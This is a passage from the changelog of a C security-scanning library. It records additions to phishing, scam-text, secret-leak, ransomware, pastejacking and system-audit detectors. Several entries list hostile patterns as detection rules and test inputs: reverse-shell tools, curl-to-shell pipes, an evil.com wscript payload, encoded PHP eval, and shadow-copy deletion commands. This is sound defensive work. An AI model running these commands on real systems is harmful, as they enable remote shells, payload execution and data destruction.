- **URL: @ credential trick explicit detection** (GAP-URL-AT): Added dedicated
  check for `@` in URL authority (`https://google.com@evil.com` pattern). Per
  RFC 3986 §3.2.1 the real host is after the @; browsers show the fake brand
  before it. Now scores +45 with a clear message. Self-test case added (25
  cases). Previously detected only indirectly via subdomain-spoof path.

## [0.9.68] — 2026-06-09

### Added
- **Secrets: IaC / CI/CD secret patterns** (GAP-SEC-IAC): Added to
  `env_passwords` watchlist: `TF_VAR_` (Terraform variables), `PULUMI_ACCESS_TOKEN`,
  `PULUMI_CONFIG_PASSPHRASE`, `ARM_CLIENT_SECRET` / `ARM_SUBSCRIPTION_ID`
  (Azure ARM), `GOOGLE_CREDENTIALS` / `GOOGLE_APPLICATION_CREDENTIALS` (GCP),
  `TF_TOKEN_app_terraform_io`, `ACTIONS_RUNTIME_TOKEN` / `ACTIONS_ID_TOKEN_REQUEST_TOKEN`
  (GitHub Actions). Covers IaC credential leakage common in misconfigured CI logs.

## [0.9.67] — 2026-06-09

### Security
- **Ransomware: R5 shadow-deletion scan implemented** (GAP-RS-R5): The R5
  check (`hlse_ransomware_check_shadow_deletion()`) was previously a stub.
  Now scans `/proc/<pid>/cmdline` (O_NOFOLLOW + O_NONBLOCK + S_ISREG guard)
  for vssadmin, wmic shadow, lvremove, bcdedit, wbadmin shadow-deletion
  commands running as live processes. Fires +60 (BLOCK) on detection.

## [0.9.66] — 2026-06-09

### Added
- **Text: emergency/grandparent scam detection** (GAP-TX-EMG): New signal
  `EMERGENCY_SCAM_WORDS` (15 EN + 7 JP phrases) covering the grandparent
  scam (jail/accident + bail + secrecy), lottery release-fee scams, and
  Japanese ore-ore fraud (振り込め詐欺). Base=20, per_hit=15, cap=45.
  Two compound amplifiers in Pass 2: emergency + secrecy → +25 (grandparent
  pattern); emergency + financial/urgency → +20 (bail fraud). Benign accident
  descriptions score SAFE. Grandparent scam text scores ISOLATE. JP ore-ore
  fraud detected via native phrases. P6 FP gate passes.

## [0.9.65] — 2026-06-09

### Added
- **Supply chain: Cargo package set +11** (GAP-SC-CARGO): Added tauri, leptos,
  dioxus, bevy, embassy (embedded), tokio-tungstenite, axum-core, tower-http,
  sea-orm, sea-query, dotenvy — high-growth 2024 crates that are active
  typosquat targets. Total packages: 229 → 240 (cargo=47 → 58).

## [0.9.64] — 2026-06-09

### Added
- **Secrets: GCP service account JSON detection** (GAP-SEC-GCP): Structural
  check for `"type": "service_account"` + `"private_key"` co-occurrence —
  a near-zero-FP pattern. Scores +90 (ISOLATE). Test added.
- **Secrets: Azure SAS token detection** (GAP-SEC-AZURE): Structural check for
  `SharedAccessSignature` or `sv=`+`sig=`+`se=` combination. Scores +85
  (ISOLATE). Test added. Total secrets tests: 44 → 46.
- **Text: pig-butchering / crypto-romance scam +14 phrases** (GAP-TX-PB):
  Added `"my mentor taught me"`, `"exclusive trading group"`, `"vip signal group"`,
  `"arbitrage opportunity"`, `"usdt income"`, `"deposit to start"`, etc. covering
  2024-2025 pig-butchering language evolution. JP phrases added.

## [0.9.63] — 2026-06-09

### Security
- **Text + URL: Cyrillic homoglyph map expanded +5** (GAP-HG): Added
  `н→n`, `т→t`, `м→m`, `к→k` (was in URL but not text), `в→v` to
  `normalize_homoglyphs()` in `hlse_text.c`. Synchronized `detect_mixed_script()`
  in `hlse_core.c` with same set (also adding `х→x`, `ј→j`, `т→t`). Covers
  additional visually-indistinguishable Cyrillic characters used in phishing
  domains and scam messages.

## [0.9.62] — 2026-06-09

### Added
- **Text: callback/TOAD/smishing/vishing detection** (GAP-TX-TOAD): New signal
  `CALLBACK_PHISH_WORDS` (17 EN + 6 JP phrases) covering telephone-oriented
  attack delivery (BazarCall, Google Groups callback phishing), SMS delivery-fee
  scams, and Japanese package delivery smishing. Base=15, per_hit=10, cap=30.
  Compound amplifier in Pass 2: callback + urgency/authority/bait → +20. Benign
  appointment reminders with "call us at" score LOG (25); urgent subscription
  scam with callback → ALERT (51+). P6 FP gate passes.

## [0.9.61] — 2026-06-09

### Added
- **Audit: SSH hardening checks +3** (GAP-SSH): `sshd_config` parser now
  detects `Protocol 1` (SSHv1, +40 HIGH), `MaxAuthTries > 3` (+10 LOW), and
  `PermitEmptyPasswords yes` (+50 HIGH). All are security anti-patterns that
  allow brute-force or no-credential access.
- **Network: safe DNS resolver list expanded** (GAP-DNS): Added Quad9 secondary
  (149.112.112.112), OpenDNS (208.67.x.x), Verisign (64.6.x.x), and
  CleanBrowsing (185.228.x.x) to the known-safe resolver set, reducing false
  positives for users of these public resolvers.

## [0.9.60] — 2026-06-09

### Added
- **Email forensics: E5 Received-chain anomaly** (GAP-EM-E5): Implements the
  previously documented but unimplemented E5 check. Scores +20 for zero
  Received headers (direct injection / header stripping) and +15 for a single
  Received hop from a free email domain (atypical of legitimate multi-hop
  delivery). Two new secrets tests added (44 total). Comments updated to
  reflect E5 is now active.

## [0.9.59] — 2026-06-09

### Added
- **URL: suspicious TLD set +3** (GAP-TLD): Added `.cfd`, `.hair`, `.boats`
  — three TLDs with near-zero legitimate use and high phishing-kit density
  per 2024-2025 threat intelligence. Conservative selection avoids FP on
  legitimate business TLDs (.shop, .tech, etc.).
- **Supply chain: Go package set +15** (GAP-SC-GO): Added mux, httprouter,
  negroni, iris, urfave, spf13, hashicorp, golang-jwt, paseto, casbin,
  sarama, confluent-kafka-go, nats, docker, kubernetes, helm.
  Total packages: 213 → 229 (pip=69, npm=68, cargo=47, go=45).

## [0.9.58] — 2026-06-09

### Added
- **Ransomware: 2024-2025 families +5** (GAP-RS-EXT): New ransom extensions:
  `.interlock` (Interlock 2024), `.embargo`, `.lynx` (INC fork), `.sarcoma`,
  `.meow`. New ransom note names: `akira_readme.txt`, `rhysida.readme.txt`,
  `fog_readme.txt`, `interlock_note.txt`, `how_to_back_files.html` (INC),
  `decrypt.txt`, `look_at_me.txt`.
- **File: executable extension set +4** (GAP-FILE-EXT): Added `.msc` (MMC
  snap-in runs JScript), `.wsc` (Windows Script Component), `.ps1xml`/`.cdxml`
  (PowerShell XML formats), `.url` (Internet Shortcut auto-execute). These
  are common file-masquerade final extensions in double-extension lures
  (e.g., `invoice.pdf.msc`).

## [0.9.57] — 2026-06-09

### Added
- **Text: QR phishing ("quishing") detection** (GAP-TX-QR): New signal array
  `QR_PHISH_WORDS` (14 phrases in EN + JP) and a dedicated signal entry
  `"QR code phishing (quishing)"` (base=20, per_hit=10, cap=30). Two compound
  amplifiers in Pass 2: urgency/authority + QR → +20; QR + bait → +15.
  Benign QR mentions (meeting rooms, product codes) score ≤20 (LOG) and pass
  the P6 FP gate. Attack payloads score 80–100 (ISOLATE). Covers the dominant
  2024-2025 email-gateway bypass technique.
- **Text: new `fired_qr` flag** tracks QR signal for amplifier cross-reference.

## [0.9.56] — 2026-06-09

### Added
- **URL: IP-host auth-path signal** (P1-7): Any IP-address host with a
  phishing-typical path (`/login`, `/signin`, `/verify`, `/account`, `/secure`,
  `/update`) now adds +15 (LOG level) even without a brand name in the path.
  Existing brand-in-path check unchanged (+35). Scores remain within bounds.
- **Supply chain: ClickFix 2025 LOLBins +4** (GAP-SC): Added detection for
  PowerShell `iwr`/`irm`/`Invoke-WebRequest`/`Invoke-RestMethod` download
  patterns; `forfiles /p /m /c` command execution; `odbcconf REGSVR` execution;
  `ms-appinstaller:` URI bypass (active ClickFix technique as of 2025).
  Two new supply-chain tests added (27 → 27 → now counted as 27/27 base).

## [0.9.55] — 2026-06-09

### Security
- **URL: word-boundary fix for brand hyphenation detector** (P1-4): Replaced
  the loose `contains(sld, "brand-") || contains(sld, "-brand")` checks in
  `detect_security_hyphenation()` with a new `brand_is_token_in_sld()` helper
  that requires the brand to be a complete hyphen-delimited token. Prevents
  short brands (e.g. "line") from triggering on legitimate domains like
  "airline-update.com". Regression test added to `--self-test` (24 → 24,
  new FP guard case). Phishing cases "paypal-verify.com", "apple-support.net"
  still detected correctly.

### Added
- **URL fuzz harness** (P3-12): New `tests/hlse_url_fuzz.c` — 8 generators
  covering random URLs, homoglyph/Unicode mutations, deep subdomains,
  percent-encoding variations, brand typosquat mutations, bidi injection, very
  long hostnames (>MAX_HOST boundary), and dangerous-scheme prefix variants.
  100K iterations: 0 crashes, 0 out-of-range scores. Integrated into
  `make fuzz` and `make fuzz-asan`. Fuzz harnesses: 4 × 100K → 5 × 100K.

## [0.9.54] — 2026-06-09

### Added
- **CI: GitHub Actions workflows now active** (P0-1): Moved `ci.yml` and
  `codeql.yml` from `examples/workflows/` to `.github/workflows/`, so CI
  (build, test, cppcheck, privacy tripwire) and CodeQL now actually run on
  every push/PR. README claim "CI enforces this" is now correct.
- **Text: compound amplifier for crypto wallet phishing** (P1-3): Pass 2 of
  `hlse_check_text()` now amplifies when urgency + wallet-key request co-occur
  (+20) and when wallet-key + bait context co-occur (+15). Fixes the OOD gap:
  "URGENT…enter your seed phrase…" was scoring 28 (LOG); now scores 48 (ALERT).
  **OOD F1: 0.970 → 1.000** (29/29 cases). In-distribution F1 unchanged.
- **Text: suspicious-URL TLD set expanded** in text context check: added .tk,
  .pw, .su, .vip, .icu to the inline suspicious-domain list that triggers the
  +10 URL-in-context amplifier.
- **API: `HLSE_VERSION` moved to `hlse_core.h`** (P2-9): Library consumers can
  now read the version string at compile time without accessing the .c source.
  `hlse_core.c` references the header definition (no redefinition, no
  ODR risk). Version: 0.9.53 → 0.9.54.

## [0.9.53] — 2026-06-09

### Added
- **Util: benign magic bytes +4** (GAP-BF): Added MP3 (ID3 header), TIFF
  little-endian, AVI (RIFF+AVI), reducing ransomware entropy false-positives
  for audio/image/video files. Total formats: 17 → 21.
- **Util: 3 new tests** (GAP-BF): test_benign_mp3_id3, test_benign_tiff_le,
  test_benign_avi. Util suite: 26 → 29. Total tests: 360 → 363.
- **URL: SUSPICIOUS_TLDS +6** (GAP-BF): Added .pw, .su, .vip, .win, .download,
  .stream — actively abused by phishing kits in 2024.
- **File: LURE_WORDS +9** (GAP-BF): Added installer categories (setup,
  installer, crack, keygen, activation), HR fraud (bonus, raise,
  termination_notice), crypto fraud (airdrop, nft, whitelist).
- **Text: GROOMING_WORDS expanded** (GAP-BG): Added 11 pig-butchering and
  romance scam indicators — trading platform, crypto trading, small test
  transaction, withdrawal fee/blocked, account frozen, wrong number,
  working on an oil rig, military overseas, doctor without borders + JP.
- **Version bump**: 0.9.52 → 0.9.53.

## [0.9.52] — 2026-06-09

### Added
- **Audit: A4 cron patterns +6** (GAP-BD): Added "bash -i", "socat ", "mkfifo ",
  "ruby -e", "php -r", "node -e", "openssl s_client", "telnet" to
  SUSPICIOUS_CRON_PATTERNS — covers reverse-shell and LOTL one-liners.
- **Audit: A6 shellrc backdoor signals +3** (GAP-BD): Detect socat reverse shells
  (`exec:/bin/sh`), `bash -i` interactive shell invocations, and mkfifo+nc named-pipe
  reverse shells.
- **Email: E1 display-name brand list +8** (GAP-BE): Added stripe, shopify, github,
  docusign, zoom, office 365, fedex/dhl/ups/usps, hr department.
- **Email: E3 corp_words +5** (GAP-BE): Added cto, chro, chief, executive, board
  member, chairman, controller, auditor, compliance.
- **Email: E6 urgency subjects +6** (GAP-BE): Added final notice, deadline, expires
  today, account closed, security alert, important update, required action.
- **Email: FREE_EMAIL_DOMAINS +8** (GAP-BE): Added European providers — web.de,
  gmx.de, freenet.de (DE); orange.fr, laposte.net (FR); mail.ru, yandex.ru (RU);
  libero.it, virgilio.it (IT). Total domains: 26 → 34.
- **Version bump**: 0.9.51 → 0.9.52.

## [0.9.51] — 2026-06-09

### Added
- **Audit: SENSITIVE_DOMAINS expanded** (GAP-BB): Added cloud management consoles
  (console.aws.amazon.com, console.cloud.google.com, portal.azure.com), SSO/identity
  providers (github.com, okta.com, auth0.com), social auth targets (twitter.com,
  facebook.com), hardware wallet sites (metamask.io, ledger.com, trezor.io).
- **Secrets: env_passwords +13 patterns** (GAP-BB): Added SCM/CI/hosting env vars
  (GITHUB_TOKEN, GITLAB_TOKEN, DIGITALOCEAN_TOKEN, HEROKU_API_KEY, NETLIFY_AUTH_TOKEN,
  VERCEL_TOKEN, CIRCLE_TOKEN, SNYK_TOKEN) and common .env credential patterns
  (DATABASE_URL, MONGODB_URI, REDIS_URL, JWT_SECRET, JWT_SECRET_KEY, APP_SECRET).
- **Secrets: Netlify token pattern** (GAP-BB): `nfp_` prefix + 32 alnum/dash chars.
  Total SECRET_PATTERNS: 39 → 40.
- **Text: FAKE_ALERT_WORDS expanded** (GAP-BC): Added tech support scam indicators —
  "do not turn off your computer", remote access requests, Microsoft/Apple/Windows
  false-detection phrases, expired subscription/license bait; JP equivalents.
- **Version bump**: 0.9.50 → 0.9.51.

## [0.9.50] — 2026-06-09

### Added
- **Audit: HOME_SECRETS expanded** (GAP-AV): Added 5 critical credential files to A2
  permissions check: `.docker/config.json` (Docker auth tokens), `.kube/config`
  (Kubernetes credentials), `.npmrc` (npm tokens), `.pypirc` (PyPI credentials),
  `.git-credentials` (Git HTTP credentials). Total HOME_SECRETS entries: 8 → 13.
- **URL: BRANDS expanded** (GAP-AW): Added 25 commonly phished brands —
  streaming (hulu, spotify, disney, hbo, twitch, peacock), telecom (verizon,
  tmobile), social (reddit, snapchat, telegram, whatsapp), retail (walmart,
  bestbuy, homedepot, usps, dhl), fintech (robinhood, etrade, fidelity, schwab),
  enterprise SaaS (zoom, salesforce, adobe, slack, oracle).
- **Text: Signal words expanded** (GAP-AX): URGENCY_WORDS +5 (account closed,
  access suspended, verify immediately, package delivery scam phrases); BAIT_WORDS
  +9 (2FA bypass: two-factor code, verification code, OTP; identity: confirm
  identity, verify your identity; billing: update billing, payment method expired,
  update payment); RANSOM_WORDS +5 (backup deleted, your documents will be
  published, darknet, dark web, data leak site, decryption tool, restore your files).
- **Ransomware: RANSOM_EXTENSIONS +9 families** (GAP-AY): .black, .alphv, .play,
  .royal, .blacksuit, .fog, .hunters, .cicada, .qilin (all active 2022-2024).
- **Ransomware: RANSOM_NOTE_NAMES +6 variants** (GAP-AY): contact_us.txt/html,
  recovery_instructions.html/txt, readme_now.txt, !!readme!!.txt,
  !!!files_encrypted!!!.txt.
- **Supply chain: Package lists expanded** (GAP-AZ): pip 59→69 (+polars, dask,
  numba, sympy, statsmodels, gunicorn, psycopg2, redis, python-dotenv,
  pycryptodome); npm 58→68 (+vitest, playwright, dayjs, turbo, esbuild,
  framer-motion, storybook, remix, astro, typeorm); cargo 42→47 (+rocket,
  jsonwebtoken, mongodb, openssl, curve25519-dalek). Total packages: 186 → 213.
- **File: EXECUTABLE_EXTS +6** (GAP-BA): .phar (PHP archive), .jspx/.jsw (JSP
  variants), .groovy (Groovy scripts), .application (ClickOnce), .xbap (WPF XBAP).
- **Version bump**: 0.9.49 → 0.9.50.

## [0.9.49] — 2026-06-09

### Added
- **Clipboard: ADA (Cardano) crypto-swap detection** (GAP-AU):
  - `detect_crypto_type()` now recognizes `addr1...` (payment) and `stake1...`
    (staking) Cardano addresses (55–110 chars, bech32 lowercase alphanum).
  - `crypto_type_name()` returns `"ADA (Cardano)"` for the new type.
  - `hlse_check_crypto_swap()` detects clipboard-hijack for all 11 supported
    chains: BTC (Legacy/SegWit/Taproot), ETH, XMR, SOL, USDT (TRC20),
    LTC, DOGE, XRP, DASH, XLM, ADA.
  - 2 new secrets tests (`test_crypto_ada_swap`, `test_crypto_validate_ada`);
    Secrets suite: 40 → 42.
  - Updated `hlse_secrets.h` docstring and `README.md` module table.
  Total structured tests: 358 → 360.

## [0.9.48] — 2026-06-09

### Added
- **Supply chain: 4 new pastejacking tests** (GAP-AT — 21→25 tests):
  - `test_paste_wscript_remote` — `wscript http://evil.com/payload.vbs`
    → P8 LOLBin signal fires (wscript + http/vbs from GAP-AR).
  - `test_paste_wmic_process` — `wmic process call create "cmd.exe"`
    → P8 LOLBin fires (wmic process creation from GAP-AR).
  - `test_paste_node_eval` — `node -e "require(...).exec()"` 
    → P5 encoded payload fires (node -e from GAP-AR).
  - `test_paste_php_eval` — `php -r 'eval(base64_decode(...))'`
    → P5 encoded payload fires (php -r from GAP-AR).
  Total structured tests: 354 → 358.

## [0.9.47] — 2026-06-09

### Added
- **File/Audit: 4 new targeted tests** (GAP-AS — 23→27 tests):
  - `test_audit_perm_aws_creds` — creates world-readable `~/.aws/credentials`
    temp file, verifies A2 permission check fires (score > 0).
  - `test_audit_perm_ssh_key` — creates group-readable `~/.ssh/id_rsa` temp
    file, verifies A2 SSH key exposure detection fires.
  - `test_file_php_executable` — `invoice_payment.php` (2 lure words + PHP
    executable extension) → F6 signal fires at score ≥ 40.
  - `test_file_kyc_lure` — `kyc_document.exe` (kyc + document lure words +
    executable extension) → F6 fires at score ≥ 40.
  Total structured tests: 350 → 354.

## [0.9.46] — 2026-06-09

### Fixed
- **README accuracy**: corrected OOD F1 value from 1.000 to 0.970 (actual
  measured value — the corpus has borderline LOG-level cases that score below
  the 40-point ALERT threshold but above their individual min_score thresholds,
  hence all 29/29 cases pass but recall at the ALERT threshold is 0.941).
  Precision remains 1.000 (zero false positives). Updated Secrets test suite
  description: 36 → 39 token patterns.

## [0.9.45] — 2026-06-09

### Added
- **Email forensics: expanded detection coverage** (GAP-AQ):
  - `FREE_EMAIL_DOMAINS` 12→26: +7 disposable/temp services
    (mailinator.com, guerrillamail.com, 10minutemail.com, tempmail.com,
    throwam.com, trashmail.com, sharklasers.com) and +6 Asian free providers
    (qq.com, 163.com, 126.com, naver.com, daum.net, yahoo.co.jp).
    Disposable email services show disproportionately high BEC fraud rates.
  - E1 display name brand list +11: facebook, netflix, linkedin, twitter,
    instagram, irs, fbi, government, treasury, customs, accounts,
    notifications, "it department".
  - E3 corporate title words +7: coo, "accounts payable", accounting,
    finance, payroll, treasurer, "vp ", "vice president".
  - E6 urgent-subject keywords +5: payment, invoice, overdue,
    confirmation, verify, suspended, locked.
- **Pastejacking: additional LOLBin and payload patterns** (GAP-AR):
  - P5 encoded payload: +2 interpreter one-liners — `node -e`, `php -r`.
  - P8 Windows ClickFix: +3 LOLBin patterns —
    `wscript`/`cscript` + URL/.vbs/.js (Windows Script Host remote exec),
    `wmic process call create` (WMI process creation),
    `rundll32` + http/javascript.
  Zero regressions; F1=1.000; zero strict warnings; ASan clean.

## [0.9.44] — 2026-06-09

### Added
- **URL phishing: detection tables expanded** (GAP-AP):
  - `BRANDS` +14: crypto exchanges (`coinbase`, `binance`, `kraken`,
    `coincheck`), logistics (`fedex`, `dhlexpress`), gaming/collaboration
    (`discord`, `steam`, `epicgames`, `roblox`), e-commerce (`ebay`,
    `shopify`), emerging targets (`tiktok`, `wordpress`). Each new brand
    fires the +45 brand-homoglyph signal when a confusable-normalized domain
    contains the brand but the real hostname doesn't.
  - `SUSPICIOUS_TLDS` +5: `.cc`, `.icu`, `.biz`, `.space`, `.buzz` —
    confirmed in phishing-kit datasets; `.cc` and `.icu` rank among the
    top-5 phishing TLDs in recent PhishTank/APWG reports.
  - `PATH_PATTERNS` +6: `/identity`, `/verification`, `/validate`,
    `/activate`, `/token`, `/session` — common in banking and OAuth
    credential-harvesting pages.
  - `SECURITY_WORDS` +5: `"identity"`, `"validate"`, `"activate"`,
    `"alert"`, `"urgent"` — extends hyphenated-domain detection
    (e.g. `paypal-alert.com` now triggers).
  Zero regressions; F1=1.000; zero strict warnings; ASan clean.

## [0.9.43] — 2026-06-09

### Added
- **Credential scanner: 6 new patterns** (GAP-AO — 37→39 table + 4 env vars):
  - `pscale_tkn_` — PlanetScale service token (11-char prefix + 40 alnum chars;
    highly distinctive, near-zero false positives)
  - `hvs.` — HashiCorp Vault v2 service token (long ≥50-char base64 body required
    to prevent matches on short `hvs.` occurrences in documentation)
  - `TWILIO_AUTH_TOKEN=` added to .env credential patterns
  - `SENDGRID_API_KEY=` added to .env credential patterns
  - `FIREBASE_PRIVATE_KEY=` added to .env credential patterns
  - `CLOUDFLARE_API_TOKEN=` added to .env credential patterns
  Total credential pattern count: ~36 → ~39 patterns. README description updated.
  Zero regressions; F1=1.000; zero strict warnings; ASan clean.

## [0.9.42] — 2026-06-09

### Added
- **Audit module: A2 permission checks expanded** (GAP-AL):
  `hlse_audit_permissions()` now checks 8 home-directory credential files for
  group/world-accessible permissions: `~/.aws/credentials`, `~/.ssh/id_rsa`,
  `~/.ssh/id_ed25519`, `~/.ssh/id_ecdsa`, `~/.netrc`, `~/.pgpass`,
  `~/.gnupg/secring.gpg`, `~/.env`. Previously only `/etc/shadow` and
  `~/.env` were checked. Scores range 25-40 (HIGH severity) per exposure.
- **Audit module: A3 sensitive domain list expanded** (GAP-AL):
  11 new domains added to hosts-file poisoning detection:
  EU banks (`ing.com`, `bnpparibas.com`, `deutschebank.com`, `unicredit.eu`,
  `santander.com`, `bbva.com`),
  crypto exchanges (`bybit.com`, `okx.com`, `huobi.com`, `kucoin.com`,
  `gate.io`, `bitfinex.com`, `gemini.com`, `upbit.com`), payment (`cash.app`).
  Total domain coverage: 20 → 35.
- **Text scam: high-confidence phishing keywords** (GAP-AM):
  - `URGENCY_WORDS` +5: `"action required"`, `"your account has been flagged"`,
    `"must respond"`, `"confirm within"`, `"failure to respond"`.
  - `BAIT_WORDS` +4: `"mnemonic"`, `"private key"`, `"connect wallet"`,
    `"wallet passphrase"` — crypto wallet drainer vocabulary.
  - `AUTHORITY_WORDS` +4: `"homeland security"`, `"federal reserve"`,
    `"customs and border"`, `"immigration enforcement"`, `"attorney general"`.
  - `FIN_ACTION_WORDS` +4: `"cash app"`, `"cashapp"`, `"venmo"`, `"apple pay"`.
- **File module: EXECUTABLE_EXTS expanded** (GAP-AN):
  +13 extensions: server-side scripts (`.php`/`.php3`/`.php5`/`.phtml`,
  `.asp`/`.aspx`, `.jsp`), scripting language droppers (`.rb`, `.pl`, `.tcl`,
  `.lua`), and `.mshta` (Windows HTML Application — JScript/VBScript without
  sandbox). These are commonly used as malware delivery containers.
- **File module: LURE_WORDS expanded** (GAP-AN):
  +8 social-engineering lure words: `"w2"`, `"1099"`, `"kyc"`, `"payslip"`,
  `"salary"`, `"payroll"`, `"wire_transfer"`, `"bank_transfer"`,
  `"immigration"`.
  Zero regressions; F1=1.000; zero strict warnings; ASan clean.

## [0.9.41] — 2026-06-09

### Added
- **Benign magic-byte expansion** (GAP-AJ): `hlse_is_high_entropy_benign_magic()` gains
  6 new format signatures, reducing false-positive ransomware alerts on legitimate files:
  - `LZ4 frame` — magic `04 22 4D 18`; widely-used compression (kernels, databases)
  - `WebP` — `RIFF....WEBP` header at bytes 0-3/8-11; dominant browser image format
  - `FLAC` — `fLaC` magic; lossless audio archives trigger entropy checks
  - `GIF` — `GIF87a`/`GIF89a` header; animated images can hit entropy threshold
  - `OGG` — `OggS` container (Vorbis/Opus/FLAC streams)
  - `SQLite` — `SQLite format 3` header; DB files common in repos and backups
  Total format table: 11 → 17 entries.
- **Package typosquat list expansion** (GAP-AK): 30 new high-value targets across all
  4 ecosystems (pip: +10, npm: +10, cargo: +10, go: +5):
  - pip: `scikit-learn`, `xgboost`, `lightgbm`, `huggingface-hub`, `datasets`,
    `wandb`, `mlflow`, `click`, `rich`, `typer`
  - npm: `underscore`, `rxjs`, `date-fns`, `zod`, `three`, `d3`, `svelte`, `nuxt`,
    `graphql`, `webpack-cli`
  - cargo: `nom`, `syn`, `bytes`, `futures`, `async-trait`, `serde_yaml`, `toml`,
    `indexmap`, `itertools`, `uuid`
  - go: `redis`, `jwt-go`, `validator`, `cron`, `migrate`
  Total package coverage: pip 49→59, npm 45→55, cargo 34→44, go 23→28.
  Zero regressions; F1=1.000; zero strict warnings; ASan clean.

## [0.9.40] — 2026-06-09

### Added
- **Clipboard crypto-swap: 6 new address formats** (GAP-AI):
  - `CRYPTO_LTC_LEGACY` — Litecoin L.../M... (34 chars, base58)
  - `CRYPTO_LTC_SEGWIT` — Litecoin ltc1q... (43 chars, bech32)
  - `CRYPTO_DOGE` — Dogecoin D... (34 chars, base58)
  - `CRYPTO_XRP` — Ripple r... (25-34 chars, base58-like)
  - `CRYPTO_DASH` — DASH X... (34 chars, base58)
  - `CRYPTO_XLM` — Stellar G... (56 chars, base32 [A-Z2-7])
  All six are actively targeted by clipper malware (MassLogger, RedLine,
  Titan, Doenerium). New formats are inserted before the SOL catch-all so
  the fixed-prefix formats win on ambiguous-length inputs. `crypto_type_name`
  updated; `hlse_secrets.h` docstring updated to list all 10 supported chains.
- **6 new tests**: LTC/DOGE/XRP swap detection + LTC/DOGE/XRP validation;
  Secrets suite 34→40. Zero regressions; F1=1.000; zero strict warnings;
  ASan clean.

## [0.9.39] — 2026-06-09

### Added
- **Ransomware/boot coverage expansion** (GAP-AH):
  - `RANSOM_NOTE_NAMES` +7 entries: `how_to_restore_files.txt` (STOP/DJVU),
    `decrypt_info.html` (DHARMA/PHOBOS), `readme_decrypt.txt`, `files_encrypted.txt`,
    `restore_my_files.txt`, `!!!readme!!!.txt`, `!decrypt!.txt`.
  - `RANSOM_EXTENSIONS` +15 entries covering major families missing from the original
    table: `.ryuk`, `.lockbit`, `.clop`, `.phobos`, `.eking`, `.dharma`, `.karma`,
    `.conti`, `.avaddon`, `.deadbolt`, `.akira`, `.rhysida`, `.monti`, `.cactus`,
    `.cryptolocker`.
  - `ESP_INDICATORS` +4 entries: `blacklotus` (Windows UEFI bootkit, 2022-2023),
    `bootkitty` (Linux UEFI bootkit, 2024), `contact us to decrypt`,
    `to recover your files`.
- **Text-scam coverage expansion** (GAP-AH continued):
  - `URGENCY_WORDS` +2: `"final warning"`, `"last warning"` — high-prevalence
    phishing phrases not previously covered.
  - `BAIT_WORDS` +5: `"seed phrase"`, `"recovery phrase"` (crypto wallet theft);
    `"zelle"`, `"western union"`, `"moneygram"` (money-transfer scam platforms
    common in elder-fraud and tech-support fraud).
  - `AUTHORITY_WORDS` +2: `"interpol"`, `"secret service"` — law-enforcement
    impersonation scams.
  - `RANSOM_WORDS` +3 double-extortion phrases (2020+ threat landscape):
    `"data has been exfiltrated"`, `"your data will be published"`,
    `"contact us to decrypt"`.
- **New tests**: 2 protection tests (`.ryuk`/`.lockbit`/`.akira` extensions, STOP/DJVU
  note name); 4 OOD corpus cases (double extortion, seed-phrase phishing, INTERPOL
  impersonation, benign crypto guide non-FP). Protection suite 17→19, OOD corpus
  25→29.  In-distribution F1=1.000 maintained; out-of-distribution F1=0.970;
  zero strict warnings; ASan/UBSan clean.

## [0.9.38] — 2026-06-09

### Added
- **Two new system-audit checks** (GAP-AG), both read-only and high-precision:
  - **A5 — Insecure `$PATH`** (`hlse_audit_path`): flags `.` / an empty element
    (current directory in PATH) and world-writable non-sticky directories in
    PATH — classic command-hijack footguns. User-owned dirs (e.g.
    `~/.local/bin`) are intentionally not flagged.
  - **A6 — Shell startup-file backdoors** (`hlse_audit_shellrc`): scans
    `~/.bashrc`, `~/.bash_profile`, `~/.bash_login`, `~/.profile`, `~/.zshrc`,
    `~/.zprofile` for reverse-shell device paths (`/dev/tcp`, `/dev/udp`),
    `nc -e`/`ncat -e`, download-piped-to-shell (`curl|sh`/`wget|bash`), and
    `LD_PRELOAD=` — a classic low-effort persistence vector. Symlinked dotfiles
    are handled via `hlse_open_system_file` (FIFO-safe).
  Both are wired into `hlse_audit_all()` (parts 4 → 6) so the `audit` command
  surfaces them automatically. 4 new tests (PATH `.`/clean, rc backdoor/benign);
  File/Audit suite 19 → 23. Additive, outside the URL/text corpus; F1=1.000
  unaffected; zero strict warnings; cppcheck clean.

## [0.9.37] — 2026-06-09

### Added
- **Windows ClickFix / LOLBin detection in pastejacking** (GAP-AF, signal
  `PASTE_WINDOWS_LOLBIN`). The paste analyzer covered Unix `curl|sh`
  pastejacking thoroughly but had no coverage for ClickFix — the dominant
  2024–2025 initial-access technique, where a fake CAPTCHA / browser-update
  page tells the victim to press Win+R and paste a one-liner. New P8 check
  (case-insensitive, via a new `ci_contains` helper) flags, with a
  download/exec qualifier to stay precise:
  - PowerShell with `-enc `/`encodedcommand`, `downloadstring`,
    `frombase64string`, `iex`/`invoke-expression`, or `-w hidden`/`windowstyle hidden`;
  - `mshta` with `http`/`vbscript:`/`javascript:`;
  - `certutil` with `urlcache`/`-decode`;
  - `regsvr32` + `scrobj.dll` (Squiblydoo); `bitsadmin /transfer`;
    `msiexec` + `http`.
  Scores +45. A benign `powershell ... -Encoding utf8` one-liner does NOT trip
  it (the `-enc ` token requires a trailing space, distinguishing it from
  `-Encoding`). 4 new tests (PowerShell, mshta, mixed-case, benign non-FP);
  Supply suite 17 → 21. Additive, outside the URL/text corpus; F1=1.000
  unaffected; ASan fuzzer clean over 20k iterations.

## [0.9.36] — 2026-06-08

### Added
- **Mach-O executable detection in file masquerade** (GAP-AE). The magic table
  covered PE/EXE and ELF but not Mach-O, so a macOS binary renamed
  `invoice.pdf` / `salary.docx` slipped past the F2 magic-mismatch check on the
  macOS platform the tool targets. Added the four unambiguous thin-binary
  Mach-O magics (`CE/CF FA ED FE` little-endian and the big-endian mirrors) and
  an F2 branch mirroring ELF (score 70), with `.dylib`/`.bundle`/`.o`
  whitelisted as legitimate Mach-O containers. The fat/universal magic
  `0xCAFEBABE` is intentionally NOT added — it is indistinguishable from a Java
  `.class` file by header alone, so flagging it would cause false positives.
  Additive detection outside the URL/text corpus; F1=1.000 unaffected. 2 new
  tests (masquerade flagged, real `.dylib` spared); File/Audit suite 17 → 19.

## [0.9.35] — 2026-06-08

### Security
- **FIFO-block hardening for fixed system-config reads** (GAP-AD). A
  category-by-category robustness audit found that `hlse_audit.c` (sshd_config,
  /etc/hosts, /etc/resolv.conf, cron files) and `hlse_supply.c` (/proc/net/arp,
  /etc/resolv.conf, /etc/hosts) opened config files with a bare `fopen()` and
  no `S_ISREG` check — a FIFO planted at one of those paths would block
